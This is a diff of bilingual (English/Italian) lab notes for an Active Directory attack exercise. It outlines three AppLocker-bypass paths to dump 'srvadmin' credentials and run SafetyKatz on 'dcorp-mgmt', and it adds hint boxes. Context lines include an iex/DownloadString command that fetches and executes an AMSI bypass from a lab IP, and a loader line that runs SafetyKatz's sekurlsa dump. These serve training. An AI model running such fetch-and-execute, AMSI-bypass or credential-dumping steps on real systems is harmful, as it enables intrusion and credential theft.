@@ -1,6 +1,13 @@
-1. Escalate privilege to Domain Admin by abusing derivative local admin trough `dcorp-adminsrv` On `dcorp-adminsrv`, tackle application allowlisting using:
-	1. Gaps in `Applocker` rules
-	2. Disable `Applocker` by modifying GPO applicable to `dcorp-adminsrv`
+
+> [!Note] Learning objective
+> Starting with local administrator access to `dcorp-adminsrv`, understand **three alternative paths** that lead to the ability to execute `SafetyKatz` on **`dcorp-mgmt`**.
+> 
+>- Path 1 — AppLocker path-rule gap → Kerberos keys:  `Invoke-TheKatEx-keys-stdx.ps1` → `srvadmin` AES256 key.
+>- Path 2 — AppLocker path-rule gap → Vault credentials: `Invoke-TheKatEx-vault-stdx.ps1` → `srvadmin` plaintext credentials.
+> - **Path 3 — Modifiable AppLocker GPO:** change the applicable policy → execute the loader on `dcorp-adminsrv` → obtain `srvadmin` authentication material.
+> 
+> **All three paths converge** on the **same shared final stage**: authenticate to `dcorp-mgmt` as `srvadmin`, stage the loader, and execute `SafetyKatz` there. We document that shared stage **only once**.
+
 
 >[!Important] 
 > Derivative local admins privileges happens when:
@@ -10,15 +17,6 @@
 > 3. `user1` gets derivative admin privileges on `machine3` using `username2`
 > ![[Pasted image 20261122110911.png]]
 > - In our case the flow is `student555` -> local admin on `dcrorp-adminsrv`, that has a user `srvadmin` -> `srvadmin` has privileges on `dcorp-mgmt` -> `student555` has privileges on `dcorp_mgmt`
-
-> [!ABSTRACT] Learning objective
-Starting with local administrator access to `dcorp-adminsrv`, understand **three alternative paths** that lead to the ability to execute `SafetyKatz` on **`dcorp-mgmt`**.
-Path 1 — AppLocker path-rule gap → Kerberos keys:** `Invoke-TheKatEx-keys-stdx.ps1` → `srvadmin` AES256 key.
-Path 2 — AppLocker path-rule gap → Vault credentials:** `Invoke-TheKatEx-vault-stdx.ps1` → `srvadmin` plaintext credentials.
-**Path 3 — Modifiable AppLocker GPO:** change the applicable policy → execute the loader on `dcorp-adminsrv` → obtain `srvadmin` authentication material.
-> **All three paths converge** on the **same shared final stage**: authenticate to `dcorp-mgmt` as `srvadmin`, stage the loader, and execute `SafetyKatz` there. We document that shared stage **only once**.
-
-  
 
 > [!NOTE] Obiettivo del laboratorio
 > Il punto di partenza è sempre lo stesso: `student555` ha già privilegi di amministratore locale su `dcorp-adminsrv`. Il problema è che su questa macchina sono presenti limitazioni all'esecuzione di script e programmi.
@@ -80,6 +78,12 @@ Enter-PSSession dcorp-adminsrv
 
 ## 1.3 Observe Constrained Language Mode (CLM)
 
+> [!warning] HINTS
+> When a PowerShell expression fails under Constrained Language Mode, we should identify whether the limitation comes from language restrictions, script execution policy, or AppLocker. 
+> 
+> They are related in some deployments but are not interchangeable controls.
+
+
 FWe are in`dcorp-adminsrv`, so we try to download and execute the AMSI bypass script:
 ```powershell
 iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.55/Amsi-Byp.txt')
@@ -107,6 +111,13 @@ $ExecutionContext.SessionState.LanguageMode
 > - **AppLocker** è una ==funzionalità di sicurezza integrata nei sistemi operativi Windows che permette agli amministratori di controllare quali app e file possono essere eseguiti dagli utenti o dai gruppi==
 
 ## 1.4 Inspect the effective AppLocker rules
+
+> [!warning] HINTS
+> For a path-based allow rule to create a meaningful weakness, we should consider both who may execute files in that path and who can write there. 
+> 
+> An allowed path is not automatically writable.
+
+
 We inspect which AppLocker rule collections apply to the machine:
 ```powershell
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
@@ -136,6 +147,13 @@ The notes identify permissive script rules for `Everyone`, including paths assoc
   
 
 # 2. PATH 1 — AppLocker path-rule gap → `srvadmin` Kerberos keys
+
+> [!warning] HINTS
+> We should label the evidence by credential type: a recovered Kerberos key is not the same as a password. 
+> 
+> The useful next question is which services accept the account and what remote permissions it actually has.
+
+
 **Goal:** take advantage of the allowed script path to inspect memory-related authentication material on `dcorp-adminsrv` and identify a usable `srvadmin` Kerberos AES256 key.
 
 ## 2.1 Copy the keys script to the allowed directory
@@ -183,6 +201,11 @@ cd 'C:\Program Files\'
 ---
 
 # 3. PATH 2 — AppLocker path-rule gap → `srvadmin` Vault credentials
+
+> [!warning] HINTS
+> The key contrast with Path 1 is the source and type of the observed credentials. 
+> 
+> Windows Vault and LSASS are different components, so we should avoid presenting their results as equivalent.
 
 **Goal:** use the same allowed-script-path weakness, but inspect **Windows Vault-related credentials instead of memory-derived Kerberos keys**.
 ## 3.1 Copy the Vault script
@@ -243,6 +266,12 @@ The command prompts for the `srvadmin` password found in the preceding output an
 
 ---
 # 4. PATH 3 — Modify the AppLocker GPO affecting `dcorp-adminsrv`
+
+> [!warning] HINTS
+> BloodHound can reveal a policy-control relationship, but we should verify group membership, the specific GPO permission, and whether the GPO effectively applies to `dcorp-adminsrv`. 
+> 
+> This is a distinct path from exploiting an existing allow rule.
+
 
 **Goal:** use an Active Directory permission relationship to change the policy applied to `dcorp-adminsrv`, then observe the difference in executable allowlisting.
 
@@ -386,6 +415,13 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa:
 ---
 
 # 5. Common convergence — Authenticate as `srvadmin`
+
+
+> [!warning] HINTS
+> The three branches have one shared goal: establish the access context reported for `srvadmin` and validate the path to `dcorp-mgmt`.
+> 
+>We should avoid repeating the final stage and compare only what differs across the branches.
+
 
 The three paths have the **same target**: an authentication context that can access `dcorp-mgmt` with `srvadmin` privileges. The authentication method depends on the artifact recovered:
 
